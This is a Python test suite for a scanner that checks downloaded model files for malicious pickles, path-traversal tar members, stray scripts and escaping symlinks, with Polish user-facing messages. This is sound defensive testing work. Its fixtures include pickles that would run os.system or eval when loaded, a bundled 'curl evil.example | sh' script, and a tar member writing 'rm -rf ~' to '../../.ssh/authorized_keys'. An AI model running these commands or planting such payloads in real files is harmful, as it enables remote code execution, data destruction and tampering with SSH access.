"""Tests for security/scan.py: the pickle disassembler and file-hygiene scanner.

Every fixture builds *real* bytes — pickle opcode streams via ``pickle.dumps``/
``__reduce__``, real zip/tar archives via the stdlib modules, a real symlink on
disk — because ``scan.py`` parses raw bytes and file-system entries, not Python
objects; a mock would only test the mock. ``tmp_path`` gives every test its own
throwaway "model directory" so nothing here touches a real model or the
developer's own machine.

None of this ever unpickles anything (that is the whole point of the module
under test): a "dangerous" fixture is pickled data that, if you were foolish
enough to call ``pickle.load`` on it, would run a command — this file never
does that, it only feeds the bytes to ``scan_path``/``scan_pickle_bytes`` and
checks the verdict.
"""

from __future__ import annotations

import io
import os
import pickle
import struct
import tarfile
import time
import zipfile
from pathlib import Path
from typing import Any

import pytest

from localcode.security.scan import (
    MAX_PICKLE_BYTES,
    MAX_PICKLE_OPCODES,
    Finding,
    ScanReport,
    scan_path,
    scan_pickle_bytes,
    scan_pickle_stream,
)


# --------------------------------------------------------------------------- #
# Pickle fixtures — real opcode streams, built without ever unpickling them
# --------------------------------------------------------------------------- #


class _ReduceToCall:
    """Pickling this embeds a call to ``target(*args)`` in the opcode stream
    (a ``GLOBAL``/``STACK_GLOBAL`` for ``target`` followed by ``REDUCE``) —
    exactly the shape a malicious "model" checkpoint uses."""

    def __init__(self, target: Any, args: tuple) -> None:
        self.target = target
        self.args = args

    def __reduce__(self):
        return (self.target, self.args)


def benign_pickle() -> bytes:
    """What a real ``state_dict`` pickle looks like: dict/list/tuple/str/int/float only."""
    return pickle.dumps({
        "state_dict": {"layer.weight": [0.1, 0.2, 0.3], "layer.bias": (0.0, 0.0)},
        "epoch": 3, "meta": {"arch": "qwen3", "ok": True},
    })


def os_system_pickle() -> bytes:
    import os as os_module
    return pickle.dumps(_ReduceToCall(os_module.system, ("echo pwned",)))


def eval_pickle() -> bytes:
    return pickle.dumps(_ReduceToCall(eval, ("1 + 1",)))


def find(findings: list[Finding], **attrs: Any) -> Finding | None:
    for f in findings:
        if all(getattr(f, k) == v for k, v in attrs.items()):
            return f
    return None


def severities(findings: list[Finding]) -> set[str]:
    return {f.severity for f in findings}


# --------------------------------------------------------------------------- #
# A benign pickle raises nothing
# --------------------------------------------------------------------------- #


def test_benign_pickle_is_clean():
    assert scan_pickle_bytes(benign_pickle()) == []


def test_benign_pickle_directory_verdict_is_clean(tmp_path: Path):
    (tmp_path / "pytorch_model.bin").write_bytes(benign_pickle())
    report = scan_path(tmp_path)
    assert report.verdict == "clean"
    assert report.is_clean and not report.dangerous
    assert report.pickle_files_analyzed == 1
    assert report.summary == "Przeanalizowano pliki pickle w repozytorium — nie znaleziono niebezpiecznych importów."


# --------------------------------------------------------------------------- #
# os.system — the canonical "REDUCE runs a shell command" attack
# --------------------------------------------------------------------------- #


def test_os_system_reduce_is_dangerous():
    findings = scan_pickle_bytes(os_system_pickle())
    assert len(findings) == 1
    f = findings[0]
    assert f.severity == "dangerous"
    assert f.kind == "pickle_import"
    # os.system's __module__ is "posix" on macOS/Linux and "os" is also denied outright;
    # either spelling must be caught, since both are on DANGEROUS_MODULES.
    module, _, qualname = (f.detail or "").rpartition(".")
    assert module in ("os", "posix", "nt")
    assert qualname == "system"
    assert "wykonać" in f.reason and "system" in f.reason
    assert "REDUCE" in f.reason        # the call is actually invoked, not just imported


def test_os_system_pickle_makes_the_directory_dangerous(tmp_path: Path):
    (tmp_path / "model.pt").write_bytes(os_system_pickle())
    report = scan_path(tmp_path)
    assert report.verdict == "dangerous"
    assert report.dangerous
    assert "Wykryto niebezpieczne elementy" in report.summary
    assert report.findings[0].file == "model.pt"


# --------------------------------------------------------------------------- #
# builtins.eval — arbitrary code, not just a shell command
# --------------------------------------------------------------------------- #


def test_eval_reduce_is_dangerous():
    findings = scan_pickle_bytes(eval_pickle())
    f = find(findings, kind="pickle_import")
    assert f is not None
    assert f.severity == "dangerous"
    assert f.detail == "builtins.eval"
    assert "dowolny kod Pythona" in f.reason


# --------------------------------------------------------------------------- #
# A safe import that merely looks unfamiliar is "suspicious", not "dangerous"
# --------------------------------------------------------------------------- #


def test_unknown_but_not_denylisted_import_is_only_suspicious():
    class Harmless:
        def __reduce__(self):
            return (list, ([1, 2, 3],))

    # list() is on the safe builtin list -> no finding at all.
    assert scan_pickle_bytes(pickle.dumps(Harmless())) == []

    data = pickle.dumps(Harmless())
    # Swap in a reference to something off every list (neither safe nor denied):
    # numpy's reconstruct helper is the realistic shape of this ("torch.something
    # we don't recognise"), simulated here with a stdlib module not on either list.
    import fractions
    findings = scan_pickle_bytes(pickle.dumps(_ReduceToCall(fractions.Fraction, (1, 2))))
    assert len(findings) == 1
    assert findings[0].severity == "suspicious"
    assert findings[0].detail == "fractions.Fraction"
    assert "nie ma na liście bezpiecznych importów" in findings[0].reason


def test_torch_and_numpy_globals_are_never_flagged():
    """The vocabulary a real checkpoint uses must never itself be a finding."""
    import collections

    findings = scan_pickle_bytes(pickle.dumps(_ReduceToCall(collections.OrderedDict, ())))
    assert findings == []


# --------------------------------------------------------------------------- #
# Zip-wrapped pickle — PyTorch's ``torch.save`` container format
# --------------------------------------------------------------------------- #


def test_zip_wrapped_pytorch_pickle_benign_is_clean(tmp_path: Path):
    path = tmp_path / "model.pt"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("archive/data.pkl", benign_pickle())
        zf.writestr("archive/version", "3")
        zf.writestr("archive/data/0", b"\x00" * 64)   # the actual tensor bytes: never opcode-walked
    report = scan_path(path)
    assert report.verdict == "clean"


def test_zip_wrapped_pytorch_pickle_dangerous_is_caught(tmp_path: Path):
    """The realistic shape of a poisoned checkpoint: a zip archive (``torch.save``
    format, ``.bin``/``.pt`` extension) whose ``data.pkl`` member is the payload."""
    path = tmp_path / "pytorch_model.bin"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("archive/data.pkl", os_system_pickle())
        zf.writestr("archive/byteorder", "little")
    report = scan_path(path)
    assert report.verdict == "dangerous"
    f = find(report.findings, kind="pickle_import")
    assert f is not None
    assert f.file == "pytorch_model.bin!archive/data.pkl"
    module, _, qualname = (f.detail or "").rpartition(".")
    assert module in ("os", "posix", "nt") and qualname == "system"


def test_zip_archive_with_a_bundled_script_is_flagged(tmp_path: Path):
    path = tmp_path / "model.pt"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("archive/data.pkl", benign_pickle())
        zf.writestr("archive/setup.sh", "#!/bin/sh\ncurl evil.example | sh\n")
    report = scan_path(path)
    assert report.verdict == "suspicious"
    f = find(report.findings, kind="archive")
    assert f is not None and "setup.sh" in f.detail


# --------------------------------------------------------------------------- #
# Tar archive with a path-traversal member
# --------------------------------------------------------------------------- #


def test_tar_traversal_member_is_dangerous(tmp_path: Path):
    path = tmp_path / "model.tar"
    with tarfile.open(path, "w") as tf:
        payload = b"#!/bin/sh\nrm -rf ~\n"
        info = tarfile.TarInfo(name="../../.ssh/authorized_keys")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
        # a normal, innocuous member alongside it
        normal = b"hello"
        info2 = tarfile.TarInfo(name="README.txt")
        info2.size = len(normal)
        tf.addfile(info2, io.BytesIO(normal))
    report = scan_path(path)
    assert report.verdict == "dangerous"
    f = find(report.findings, kind="archive", severity="dangerous")
    assert f is not None
    assert f.detail == "../../.ssh/authorized_keys"
    assert "poza katalog modelu" in f.reason


def test_tar_symlink_member_escaping_the_archive_is_dangerous(tmp_path: Path):
    path = tmp_path / "model.tar"
    with tarfile.open(path, "w") as tf:
        info = tarfile.TarInfo(name="link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tf.addfile(info)
    report = scan_path(path)
    assert report.verdict == "dangerous"
    f = find(report.findings, kind="archive", severity="dangerous")
    assert f is not None and f.detail == "/etc/passwd"


def test_tar_wrapped_dangerous_pickle_member_is_caught(tmp_path: Path):
    path = tmp_path / "checkpoint.tar.gz"
    with tarfile.open(path, "w:gz") as tf:
        data = os_system_pickle()
        info = tarfile.TarInfo(name="weights.pkl")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    report = scan_path(path)
    assert report.verdict == "dangerous"


# --------------------------------------------------------------------------- #
# Safe-by-construction formats: safetensors / GGUF / MLX npz
# --------------------------------------------------------------------------- #


def test_safetensors_only_directory_is_clean_by_construction(tmp_path: Path):
    (tmp_path / "model.safetensors").write_bytes(b"\x00" * 128)
    (tmp_path / "model-00002-of-00002.safetensors").write_bytes(b"\x00" * 128)
    (tmp_path / "config.json").write_text('{"model_type": "qwen3"}')
    (tmp_path / "tokenizer_config.json").write_text("{}")
    report = scan_path(tmp_path)
    assert report.verdict == "clean"
    assert report.pickle_files_analyzed == 0
    assert report.files_scanned == 4
    assert "wyłącznie bezpieczne formaty" in report.summary
    assert report.findings == []


def test_gguf_file_is_clean_and_never_opcode_walked(tmp_path: Path):
    """A single ``.gguf`` file: recognised by extension, its contents are never read."""
    path = tmp_path / "model.gguf"
    path.write_bytes(b"GGUF" + b"\x00" * 256)  # not a real GGUF; extension alone decides
    report = scan_path(path)
    assert report.verdict == "clean"
    assert report.files_scanned == 1
    assert report.pickle_files_analyzed == 0
    assert report.findings == []


def test_mlx_npz_file_is_clean(tmp_path: Path):
    """``.npz`` is technically a zip container internally, but the scanner treats it
    as a safe data format by extension and never looks inside — see module docstring."""
    path = tmp_path / "weights.npz"
    with zipfile.ZipFile(path, "w") as zf:      # a real (if tiny) npz-shaped zip
        zf.writestr("arr_0.npy", b"\x93NUMPY" + b"\x00" * 32)
    report = scan_path(path)
    assert report.verdict == "clean"
    assert report.pickle_files_analyzed == 0    # proof it was never opened as an archive


def test_mlx_directory_with_npz_weights_is_clean(tmp_path: Path):
    (tmp_path / "weights.npz").write_bytes(b"PK\x03\x04" + b"\x00" * 64)
    (tmp_path / "config.json").write_text("{}")
    report = scan_path(tmp_path)
    assert report.verdict == "clean"
    assert report.pickle_files_analyzed == 0


# --------------------------------------------------------------------------- #
# File-hygiene policy: things with no business in a model repo
# --------------------------------------------------------------------------- #


def test_stray_shell_script_is_suspicious_not_dangerous(tmp_path: Path):
    (tmp_path / "model.safetensors").write_bytes(b"\x00" * 32)
    (tmp_path / "run.sh").write_text("#!/bin/sh\necho hi\n")
    report = scan_path(tmp_path)
    assert report.verdict == "suspicious"
    assert not report.dangerous
    f = find(report.findings, file="run.sh")
    assert f is not None
    assert f.kind == "file_policy" and f.severity == "suspicious" and f.detail == "code_file"
    assert "sprawdź szczegóły przed wczytaniem" in report.summary


def test_stray_python_file_is_also_flagged(tmp_path: Path):
    (tmp_path / "model.safetensors").write_bytes(b"\x00" * 32)
    (tmp_path / "convert.py").write_text("print('hi')\n")
    report = scan_path(tmp_path)
    assert report.verdict == "suspicious"
    assert find(report.findings, file="convert.py", detail="code_file") is not None


def test_native_executable_header_is_dangerous(tmp_path: Path):
    (tmp_path / "model.safetensors").write_bytes(b"\x00" * 32)
    (tmp_path / "helper").write_bytes(b"\x7fELF" + b"\x00" * 32)
    report = scan_path(tmp_path)
    assert report.verdict == "dangerous"
    f = find(report.findings, file="helper")
    assert f is not None and f.detail == "native_executable"


# --------------------------------------------------------------------------- #
# Symlink escaping the model directory
# --------------------------------------------------------------------------- #


def test_symlink_outside_the_model_directory_is_dangerous(tmp_path: Path):
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    (model_dir / "model.safetensors").write_bytes(b"\x00" * 16)
    outside = tmp_path / "outside_secret.txt"
    outside.write_text("not part of the model")
    os.symlink(outside, model_dir / "config.json")   # a plausible-looking name for the escape

    report = scan_path(model_dir)
    assert report.verdict == "dangerous"
    f = find(report.findings, file="config.json")
    assert f is not None
    assert f.kind == "file_policy" and f.severity == "dangerous"
    assert "poza katalog modelu" in f.reason
    assert Path(f.detail) == outside.resolve()


def test_symlink_inside_the_model_directory_is_not_flagged(tmp_path: Path):
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    real = model_dir / "model.safetensors"
    real.write_bytes(b"\x00" * 16)
    os.symlink(real, model_dir / "alias.safetensors")
    report = scan_path(model_dir)
    assert report.verdict == "clean"


# --------------------------------------------------------------------------- #
# Streaming: a huge file is never read into memory
# --------------------------------------------------------------------------- #


class _CountingFile:
    """Wraps a real file object and records the largest single ``read``/``readline``
    request that ever reached it — the load-bearing measurement for "never loads
    a huge file into memory": if this stays bounded, no single call materialised
    more than that many bytes, no matter how large the underlying file is."""

    def __init__(self, fh: Any) -> None:
        self._fh = fh
        self.max_single_read = 0
        self.total_read = 0

    def read(self, size: int = -1) -> bytes:
        chunk = self._fh.read(size)
        self.max_single_read = max(self.max_single_read, len(chunk))
        self.total_read += len(chunk)
        return chunk

    def readline(self, size: int = -1) -> bytes:
        chunk = self._fh.readline(size)
        self.max_single_read = max(self.max_single_read, len(chunk))
        self.total_read += len(chunk)
        return chunk


def test_opcode_flood_is_truncated_not_fully_processed():
    """A pickle with far more opcodes than a metadata stream ever needs stops early."""
    huge = b"\x80\x04" + (b"N" * (MAX_PICKLE_OPCODES + 10_000)) + b"."
    with io.BytesIO(huge) as fh:
        counter = _CountingFile(fh)
        findings = scan_pickle_stream(counter, label="huge.pkl")
    assert find(findings, detail="truncated") is not None
    assert severities(findings) <= {"suspicious"}
    # far fewer bytes were ever pulled through than the file's own size
    assert counter.total_read < len(huge)


def test_single_opcode_claiming_a_huge_length_is_still_bounded(tmp_path: Path):
    """A single ``BINUNICODE8`` opcode can *declare* an arbitrary 8-byte length and
    hand that straight to one ``read(n)`` call — the realistic way one crafted
    opcode, not a long opcode stream, tries to make the scanner allocate a huge
    chunk in one shot. The per-call cap in ``_BoundedReader`` must catch this
    case too, not just the running total across many calls.
    """
    declared = 3 * MAX_PICKLE_BYTES          # far more than the whole budget
    payload = b"a" * declared
    opcode = b"\x8d" + struct.pack("<Q", declared) + payload   # BINUNICODE8
    data = b"\x80\x04" + opcode + b"."
    path = tmp_path / "huge_field.pt"
    path.write_bytes(data)

    with open(path, "rb") as fh:
        counter = _CountingFile(fh)
        findings = scan_pickle_stream(counter, label="huge_field.pt")

    # the whole point: no single read() call ever pulled more than the pickle
    # budget, even though one opcode declared a length several times that size.
    assert counter.max_single_read <= MAX_PICKLE_BYTES
    assert find(findings, detail="truncated") is not None


def test_no_newline_run_does_not_read_past_the_budget(tmp_path: Path):
    """Protocol-0 opcodes (``STRING``/``PUT``/``GET``/…) read a newline-terminated
    field via a bare ``readline()`` — a stream with no newline for a long stretch
    must not turn that into "read until EOF" either."""
    path = tmp_path / "no_newline.pkl"
    with open(path, "wb") as fh:
        fh.write(b"S'")                       # STRING opcode + opening quote
        chunk = b"a" * (1024 * 1024)
        for _ in range(3 * MAX_PICKLE_BYTES // len(chunk) + 1):
            fh.write(chunk)                    # never a '\n' anywhere in this stream

    with open(path, "rb") as fh:
        counter = _CountingFile(fh)
        findings = scan_pickle_stream(counter, label="no_newline.pkl")

    assert counter.max_single_read <= MAX_PICKLE_BYTES
    assert find(findings, detail="truncated") is not None


def test_huge_safetensors_file_is_never_opened(tmp_path: Path):
    """A multi-gigabyte safe-format file must be recognised (and skipped) by
    extension alone — proven here by a sparse file real disk tools would take
    a while to read fully, scanned in well under a second."""
    path = tmp_path / "huge.safetensors"
    with open(path, "wb") as fh:
        fh.seek(4 * 1024 * 1024 * 1024 - 1)    # 4 GiB, sparse: no real bytes written
        fh.write(b"\x00")
    assert path.stat().st_size == 4 * 1024 * 1024 * 1024

    started = time.monotonic()
    report = scan_path(path)
    elapsed = time.monotonic() - started

    assert report.verdict == "clean"
    assert elapsed < 2.0, f"scanning a safe-format file took {elapsed:.2f}s — looks like it was fully read"


def test_huge_pickle_directory_scan_completes_quickly(tmp_path: Path):
    """End-to-end (``scan_path`` on a directory, not the low-level pickle
    functions): a many-megabyte pickle sitting next to real weights must not
    make a routine post-download scan noticeably slow."""
    declared = 2 * MAX_PICKLE_BYTES
    opcode = b"\x8d" + struct.pack("<Q", declared) + (b"a" * declared)
    (tmp_path / "suspicious.bin").write_bytes(b"\x80\x04" + opcode + b".")
    (tmp_path / "model.safetensors").write_bytes(b"\x00" * 64)

    started = time.monotonic()
    report = scan_path(tmp_path)
    elapsed = time.monotonic() - started

    assert elapsed < 2.0
    assert report.verdict == "suspicious"     # truncated, not proven dangerous — still not cleared


# --------------------------------------------------------------------------- #
# Polish wording of the report (the whole point: this is user-facing)
# --------------------------------------------------------------------------- #


def test_summary_wording_for_each_verdict(tmp_path: Path):
    clean_dir = tmp_path / "clean"
    clean_dir.mkdir()
    (clean_dir / "model.safetensors").write_bytes(b"\x00" * 8)
    clean = scan_path(clean_dir)
    assert clean.summary == ("Repozytorium zawiera wyłącznie bezpieczne formaty (safetensors/GGUF/MLX npz) — "
                             "nic się nie wykonuje przy wczytywaniu.")

    suspicious_dir = tmp_path / "suspicious"
    suspicious_dir.mkdir()
    (suspicious_dir / "model.safetensors").write_bytes(b"\x00" * 8)
    (suspicious_dir / "tool.sh").write_text("echo hi")
    suspicious = scan_path(suspicious_dir)
    assert suspicious.summary == ("Znaleziono podejrzane elementy w plikach modelu (liczba: 1) — "
                                  "sprawdź szczegóły przed wczytaniem.")

    dangerous_dir = tmp_path / "dangerous"
    dangerous_dir.mkdir()
    (dangerous_dir / "model.bin").write_bytes(os_system_pickle())
    dangerous = scan_path(dangerous_dir)
    assert dangerous.summary == "Wykryto niebezpieczne elementy w plikach modelu (liczba: 1) — wczytanie mogłoby uruchomić kod."


def test_missing_path_reports_in_polish(tmp_path: Path):
    report = scan_path(tmp_path / "does-not-exist")
    assert report.verdict == "suspicious"
    assert report.summary == "Nie znaleziono pliku ani katalogu do przeskanowania."
    assert report.findings[0].reason == "Ścieżka nie istnieje."


def test_empty_directory_reports_in_polish(tmp_path: Path):
    empty = tmp_path / "empty"
    empty.mkdir()
    report = scan_path(empty)
    assert report.verdict == "clean"
    assert report.summary == "Nie znaleziono żadnych plików do sprawdzenia."


def test_findings_carry_no_english_reason_text():
    """Every ``Finding.reason`` is meant for the UI — spot-check the
    characteristic Polish diacritics/words are present, not stray English."""
    findings = scan_pickle_bytes(os_system_pickle())
    assert findings and all(any(c in f.reason for c in "ąćęłńóśźż") or "REDUCE" in f.reason
                            for f in findings)


# --------------------------------------------------------------------------- #
# ScanReport / Finding DTO shape (what library.py and the UI consume)
# --------------------------------------------------------------------------- #


def test_to_dict_is_camelcase_and_json_ready(tmp_path: Path):
    (tmp_path / "model.bin").write_bytes(os_system_pickle())
    report = scan_path(tmp_path)
    d = report.to_dict()
    assert set(d) == {"verdict", "summary", "findings", "filesScanned", "filesSkipped",
                      "pickleFilesAnalyzed", "target", "scannedAt"}
    assert d["verdict"] == "dangerous"
    assert isinstance(d["scannedAt"], int) and d["scannedAt"] > 0
    finding = d["findings"][0]
    assert set(finding) >= {"file", "kind", "severity", "reason"}


def test_finding_without_detail_omits_the_key():
    f = Finding(file="x", kind="file_policy", severity="suspicious", reason="r")
    assert "detail" not in f.to_dict()


def test_scan_report_dangerous_and_clean_properties():
    r1 = ScanReport(verdict="dangerous", summary="s")
    r2 = ScanReport(verdict="clean", summary="s")
    r3 = ScanReport(verdict="suspicious", summary="s")
    assert r1.dangerous and not r1.is_clean
    assert r2.is_clean and not r2.dangerous
    assert not r3.dangerous and not r3.is_clean


# --------------------------------------------------------------------------- #
# Malformed input never raises out of the scanner
# --------------------------------------------------------------------------- #


def test_garbage_pickle_is_a_parse_error_not_an_exception():
    findings = scan_pickle_bytes(b"\xff\xff\xff\xff not a pickle at all")
    assert len(findings) == 1
    assert findings[0].kind == "parse_error" and findings[0].severity == "suspicious"
    assert "niezaufany" in findings[0].reason


def test_truncated_zip_is_a_parse_error(tmp_path: Path):
    path = tmp_path / "broken.bin"
    path.write_bytes(b"PK\x03\x04" + b"\x00" * 8)   # zip magic, not a real archive
    report = scan_path(path)
    assert report.verdict == "suspicious"
    assert find(report.findings, kind="parse_error") is not None


def test_unreadable_symlink_target_does_not_crash(tmp_path: Path):
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    (model_dir / "model.safetensors").write_bytes(b"\x00" * 8)
    # a dangling symlink (target never created)
    os.symlink(model_dir / "does-not-exist-at-all", model_dir / "dangling")
    report = scan_path(model_dir)      # must not raise
    assert report.verdict in ("clean", "suspicious", "dangerous")


# --------------------------------------------------------------------------- #
# File count / archive member bounds are themselves reported, not silently applied
# --------------------------------------------------------------------------- #


def test_max_files_cutoff_is_reported(tmp_path: Path):
    for i in range(5):
        (tmp_path / f"f{i}.txt").write_text("x")
    report = scan_path(tmp_path, max_files=3)
    assert report.files_skipped == 2
    assert find(report.findings, detail="max_files") is not None
